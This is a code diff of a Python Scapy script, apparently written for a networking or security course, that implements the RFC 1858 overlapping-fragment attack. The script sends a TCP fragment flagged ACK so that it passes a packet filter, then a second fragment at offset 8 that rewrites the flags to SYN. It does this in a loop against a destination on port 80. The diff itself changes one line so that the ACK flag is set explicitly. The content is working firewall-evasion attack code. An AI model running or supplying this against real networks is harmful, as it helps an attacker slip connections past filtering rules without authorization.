@@ -7,7 +7,7 @@ sport=rand.randint(1024,65535)
 #This attack is implemented from concept of the RFC1858 file on moodle, example 4.1
 for i in range(int(nbofpkts)):
     data="data"*24
-    f1 = IP(dst=dest, id=1, frag=0, flags="MF")/TCP(sport=sport, dport=80, seq=100, ack=1)#First send a fragment with SYN=0 and ACK=1 with an offset of 0, this fragment will be able to pass
+    f1 = IP(dst=dest, id=1, frag=0, flags="MF")/TCP(sport=sport, dport=80, seq=100,flags='A', ack=1)#First send a fragment with SYN=0 and ACK=1 with an offset of 0, this fragment will be able to pass
     f2 = IP(dst=dest, id=1, frag=1, flags=0)/TCP(sport=sport, dport=80, seq=100, flags='S', ack=0)/data#then send another fragment with offset 8 but with a different value of SYN and ACK, set SYN=1 and ACK=0 to overwrite the flags in the first fragment
     send(f1)
     send(f2)
